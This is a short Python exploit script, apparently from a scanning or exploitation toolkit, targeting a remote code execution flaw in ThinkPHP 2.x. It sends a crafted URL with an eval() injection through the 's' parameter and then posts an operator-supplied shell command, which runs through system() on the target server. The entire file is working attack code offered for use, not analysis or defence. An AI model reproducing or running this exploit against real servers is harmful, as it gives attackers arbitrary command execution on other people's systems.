"""  
@Time: 2023/11/1 11:24 
@Auth: Y5neKO
@File: Thinkphp2_rce.py 
@IDE: PyCharm 
"""

import requests
import urllib
from urllib.parse import urljoin


def run(url, cmd):
    try:
        payload = r'/index.php?s=a/b/c/${@print(eval($_POST[cmd]))}'
        payload = url + payload
        response = requests.post(payload, data={"cmd": "echo '{{{{{';system('" + str(cmd) + "');echo '}}}}}';"})
        if response.status_code == 200:
            return True, response.text
        else:
            return False, "利用失败"
    except:
        return False
